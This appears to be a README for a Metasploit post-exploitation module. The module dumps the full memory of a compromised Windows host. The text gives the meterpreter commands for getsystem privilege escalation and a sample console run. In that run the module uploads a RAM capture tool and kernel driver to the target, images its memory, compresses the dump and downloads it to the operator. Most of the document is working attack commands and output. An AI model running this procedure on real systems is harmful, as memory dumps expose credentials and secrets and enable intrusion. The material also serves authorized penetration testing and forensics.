# Metasploit Modules

## Utilization

After you got an meterpreter session run the command bellow If the script requires SYSTEM
```
meterpreter > getsystem
```

After that run the script, for example
```
meterpreter > run post/windows/gather/forensics/memorydump RAMCAPTURE_PATH="/tmp/Ram_Capturer/"
```

## Samples
```
meterpreter > getsystem 
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > background 
[*] Backgrounding session 1...

msf exploit(multi/handler) > use windows/gather/forensics/memorydump
msf post(windows/gather/forensics/memorydump) > show options

Module options (post/windows/gather/forensics/memorydump):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   RAMCAPTURE_PATH                   yes       Path of Belkasoft RAM Capturer
   SESSION                           yes       The session to run this module on.

msf post(windows/gather/forensics/memorydump) > show info

       Name: Windows Gather Memory Dump Imaging
     Module: post/windows/gather/forensics/memorydump
   Platform: Windows
       Arch: x86, x64
       Rank: Normal
  Disclosed: 2018-09-15

Provided by:
  Helvio Junior (M4v3r1cK) <m4v3r1ck.hjr@gmail.com>

Compatible session types:
  Meterpreter

Basic options:
  Name             Current Setting  Required  Description
  ----             ---------------  --------  -----------
  RAMCAPTURE_PATH                   yes       Path of Belkasoft RAM Capturer
  SESSION                           yes       The session to run this module on.

Description:
  This module will perform a memory dump of remote machine. This
  Module depends on Belkasoft RAM Capturer available at
  https://belkasoft.com/ram-capturer

msf post(windows/gather/forensics/memorydump) > set session 1
session => 1
msf post(windows/gather/forensics/memorydump) > set RAMCAPTURE_PATH /tmp/
RAMCAPTURE_PATH => /tmp/
msf post(windows/gather/forensics/memorydump) > run

[*] Executing memory dump of x64 system
[!] Sending file, this may take some time...
[-] File not found: /tmp/x64/msvcp110.dll
[!] This module depeds on Belkasoft RAM Capturer application available at https://belkasoft.com/ram-capturer
[*] You need to download end extract the Belkasoft RAM Capturer at this system and set RAMCAPTURE_PATH option to ram capture path
[*] For example: If the ram capture was extracted at /root/, this will have a structure of directories similar at showed bellow
[*] /root/
[*] ├── Ram_Capturer
[*] │   ├── x64
[*] │   │   ├── RamCapture64.exe
[*] │   └── x86
[*] │       └── RamCapture.exe
[!] At this case you need to set RAMCAPTURE_PATH to /root/Ram_Capturer
[*] Post module execution completed
msf post(windows/gather/forensics/memorydump) > set RAMCAPTURE_PATH /root/Ram_Capturer
RAMCAPTURE_PATH => /root/Ram_Capturer
msf post(windows/gather/forensics/memorydump) > run

[*] Executing memory dump of x64 system
[!] Sending file, this may take some time...
[*] Uploading file C:\Windows\TEMP\msvcp110.dll
[*] Uploading file C:\Windows\TEMP\msvcr110.dll
[*] Uploading file C:\Windows\TEMP\RamCapture64.exe
[*] Uploading file C:\Windows\TEMP\ramcapturedriver.cat
[*] Uploading file C:\Windows\TEMP\RamCaptureDriver64.sys
[*] Running RamCapture64.exe
[!] This may take some time...
[*] Remote memory dump file saved at C:\Windows\TEMP\XocWoV\XocWoV.vmem
[*] Memory dump size: 792723456B
[*] Trying to compress C:\Windows\TEMP\XocWoV\XocWoV.vmem via PowerShell
[*]   Script file uploaded to C:\Windows\TEMP\zip.ps1
[!]   Compressing file, this may take some time...
[*] Compressed Memory dump size: 222393300B
[*] Downloading memory dump to /tmp/XocWoV.zip
[*] Downloading fineshed
[*] Post module execution completed
msf post(windows/gather/forensics/memorydump) >
```

